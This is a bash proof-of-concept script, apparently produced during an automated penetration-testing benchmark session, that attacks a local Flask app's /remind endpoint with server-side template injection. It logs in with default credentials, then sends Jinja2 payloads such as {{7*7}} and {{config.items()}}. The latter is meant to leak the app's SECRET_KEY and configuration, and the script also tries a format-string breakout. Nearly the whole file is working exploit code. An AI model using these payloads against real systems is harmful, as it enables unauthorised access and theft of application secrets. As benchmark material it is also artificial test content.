#!/bin/bash
# POC: Advanced SSTI POC for /remind endpoint testing multiple injection techniques
# Target: ./repo
# Created: 2025-12-01T16:01:44.389Z
# Session: benchmark-XBEN-093-24-minbvw4l

# Server-Side Template Injection (SSTI) POC for /remind endpoint
# This script demonstrates Jinja2 template injection vulnerability
# Testing with multiple payload variations

TARGET="${1:-http://localhost:5003}"
REMIND_ENDPOINT="${TARGET}/remind"
LOGIN_ENDPOINT="${TARGET}/login"
COOKIE_JAR=$(mktemp)

echo "=========================================="
echo "SSTI Vulnerability POC - /remind Endpoint"
echo "=========================================="
echo ""

# Step 1: Authenticate with default credentials
echo "[*] Step 1: Authenticating with default credentials (user/user)"
AUTH_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "$LOGIN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" -L)
echo "    ✓ Authentication completed"
echo ""

# Test 1: Direct template expression in GET request
echo "[*] Test 1: Basic Math Expression in URL - 7*7"
RESPONSE=$(curl -s -b "$COOKIE_JAR" "${REMIND_ENDPOINT}?date=test{{7*7}}test")
echo "    URL: ${REMIND_ENDPOINT}?date=test{{7*7}}test"
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "49"; then
    echo "    ✓ VULNERABLE: Template code evaluated (49 found)"
elif echo "$RESPONSE" | grep -q "test49test"; then
    echo "    ✓ VULNERABLE: Template code evaluated in output"
fi
echo ""

# Test 2: String formatting vulnerability
echo "[*] Test 2: String with template expression"
RESPONSE=$(curl -s -b "$COOKIE_JAR" "${REMIND_ENDPOINT}?date={{1+1}}")
echo "    URL: ${REMIND_ENDPOINT}?date={{1+1}}"
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "2"; then
    echo "    ✓ VULNERABLE: Expression evaluated to 2"
fi
echo ""

# Test 3: Config access
echo "[*] Test 3: Accessing config object"
RESPONSE=$(curl -s -b "$COOKIE_JAR" "${REMIND_ENDPOINT}?date=start{{config.items()}}end")
echo "    URL: ${REMIND_ENDPOINT}?date=start{{config.items()}}end"
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -qE "dict_items|SECRET_KEY|DEBUG"; then
    echo "    ✓ VULNERABLE: Config accessed"
elif echo "$RESPONSE" | grep -q "start"; then
    echo "    ~ Response received (analyzing...)"
    echo "    First 500 chars: $(echo "$RESPONSE" | head -c 500)"
fi
echo ""

# Test 4: Look at page structure to find injection point
echo "[*] Test 4: Analyzing page structure for injection"
RESPONSE=$(curl -s -b "$COOKIE_JAR" "${REMIND_ENDPOINT}?date=INJECTIONTEST")
echo "    URL: ${REMIND_ENDPOINT}?date=INJECTIONTEST"
echo "    Full Response:"
echo "$RESPONSE"
echo ""
if echo "$RESPONSE" | grep -q "INJECTIONTEST"; then
    echo "    ✓ Injection point found: user input reflected in page"
    POSITION=$(echo "$RESPONSE" | grep -n "INJECTIONTEST" | head -1)
    echo "    Position: $POSITION"
fi
echo ""

# Test 5: Try to break out of format string
echo "[*] Test 5: Format String Breakout"
RESPONSE=$(curl -s -b "$COOKIE_JAR" "${REMIND_ENDPOINT}?date=2024-01-01%7d%7d{{7*7}}%7b%7b")
echo "    URL: ${REMIND_ENDPOINT}?date=2024-01-01}}{{7*7}}{{"
echo "    Response: $RESPONSE"
echo ""

# Cleanup
rm -f "$COOKIE_JAR"

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "Analysis of /remind endpoint for SSTI vulnerability"
echo ""